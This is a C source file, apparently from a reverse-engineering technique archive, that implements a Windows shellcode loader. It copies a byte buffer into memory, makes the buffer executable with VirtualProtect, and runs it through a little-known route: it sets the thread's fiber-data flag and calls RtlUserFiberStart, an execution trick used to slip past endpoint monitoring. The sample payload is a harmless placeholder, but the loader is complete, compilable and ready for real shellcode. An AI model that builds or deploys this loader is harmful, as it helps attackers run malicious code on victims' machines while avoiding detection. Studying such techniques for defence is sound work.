/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new thread.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  RtlUserFiberStart
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)

#if defined(_WIN64)
#define TEB_FIBERDATA_PTR_OFFSET    0x17ee
#define LPFIBER_IP_OFFSET           0x0a8
#else 
// need more research
#define TEB_FIBERDATA_PTR_OFFSET    0xfca
#define LPFIBER_IP_OFFSET           0x0a8
#endif 

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI RtlUserFiberStart_t ();
typedef RtlUserFiberStart_t FAR * pRtlUserFiberStart;


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread = NULL;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;

    // function pointer to internal API
    pRtlUserFiberStart RtlUserFiberStart;

    _TEB * teb;
    void * pTebFlags;
    uintptr_t fiberdata;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    RtlUserFiberStart = (pRtlUserFiberStart) GetProcAddress(ntdll, "RtlUserFiberStart");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // get the TEB flags by traversing through TEB and set the HasFiberData
        teb = NtCurrentTeb();
        pTebFlags = (void*)((uintptr_t)teb + TEB_FIBERDATA_PTR_OFFSET);
        *(char*)pTebFlags = *(char*)pTebFlags | 0b100;

        // store the shellcode address at the offset of FiberContext RIP in the Fiber Data
        fiberdata = (uintptr_t)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
        *(LPVOID*)(fiberdata + LPFIBER_IP_OFFSET) = runtime;

        // fiber data is located at TIB,
        //      32-bit -> FS:[0x10]
        //      64-bit -> GS:[0x20]
#if defined(_WIN64)
        __writegsqword(0x20, fiberdata);
#else
        __writefsdword(0x10, fiberdata);
#endif

        RtlUserFiberStart();
        HeapFree(GetProcessHeap(), 0, (LPVOID)fiberdata);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}